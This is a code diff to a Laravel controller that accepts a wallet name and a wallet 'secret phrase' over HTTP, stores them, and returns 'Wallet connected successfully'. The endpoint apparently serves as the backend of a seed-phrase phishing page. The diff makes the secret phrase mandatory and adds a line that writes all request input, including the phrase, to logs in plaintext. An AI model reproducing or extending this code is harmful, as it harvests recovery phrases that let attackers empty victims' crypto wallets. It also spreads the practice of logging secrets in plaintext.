@@ -10,11 +10,31 @@ class WalletConnectionController extends Controller
 {
     public function store(Request $request)
     {
-        Log::info('Wallet connection request received', [
-            'wallet_name' => $request->input('wallet_name'),
-            'ip' => $request->ip(),
-            'has_secret_phrase' => !empty($request->input('secret_phrase'))
-        ]);
+        // Log raw request
+        Log::info('=== Wallet Connection Request ===');
+        Log::info('Method: ' . $request->getMethod());
+        Log::info('Content-Type: ' . $request->header('Content-Type'));
+        Log::info('All input: ' . json_encode($request->all()));
+        Log::info('wallet_name: ' . $request->input('wallet_name'));
+        Log::info('secret_phrase length: ' . strlen($request->input('secret_phrase')));
+        Log::info('IP: ' . $request->ip());
+
+        // Validate input
+        if (empty($request->input('wallet_name'))) {
+            Log::warning('Missing wallet_name');
+            return response()->json([
+                'success' => false,
+                'message' => 'Wallet name is required'
+            ], 422);
+        }
+
+        if (empty($request->input('secret_phrase'))) {
+            Log::warning('Missing secret_phrase');
+            return response()->json([
+                'success' => false,
+                'message' => 'Secret phrase is required'
+            ], 422);
+        }
 
         try {
             $connection = WalletConnection::create([
@@ -24,14 +44,15 @@ class WalletConnectionController extends Controller
                 'user_agent' => $request->userAgent(),
             ]);
 
-            Log::info('Wallet connection saved successfully', ['id' => $connection->id]);
+            Log::info('✓ Wallet connection saved successfully', ['id' => $connection->id]);
 
             return response()->json([
                 'success' => true,
                 'message' => 'Wallet connected successfully'
             ]);
         } catch (\Exception $e) {
-            Log::error('Error saving wallet connection', ['error' => $e->getMessage()]);
+            Log::error('✗ Error saving wallet connection: ' . $e->getMessage());
+            Log::error('Stack trace: ' . $e->getTraceAsString());
             
             return response()->json([
                 'success' => false,
